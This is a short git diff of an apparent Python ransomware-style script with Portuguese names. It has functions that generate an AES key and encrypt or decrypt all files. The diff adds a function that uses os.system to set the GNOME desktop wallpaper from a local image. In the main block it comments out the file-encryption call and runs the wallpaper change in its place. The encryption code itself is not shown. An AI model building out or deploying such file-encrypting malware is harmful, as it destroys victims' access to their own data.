@@ -122,7 +122,8 @@ def gera_chave_AES():
     f.close()
     return senha
 
-
+def change_background():
+    os.system('gsettings set org.gnome.desktop.background picture-uri '+ os.getcwd()+'/wallpaper.jpg')
 
 def crypto_all():
 
@@ -165,8 +166,15 @@ def decrypt_all():
 
 # MAIN
 if __name__ == "__main__":
-    crypto_all()
+    #crypto_all()
+    change_background()
     #decrypt_all()
+
+
+
+
+
+
 
 # == ALGORITMO ==
     # criptografa todos os arquivos com AES
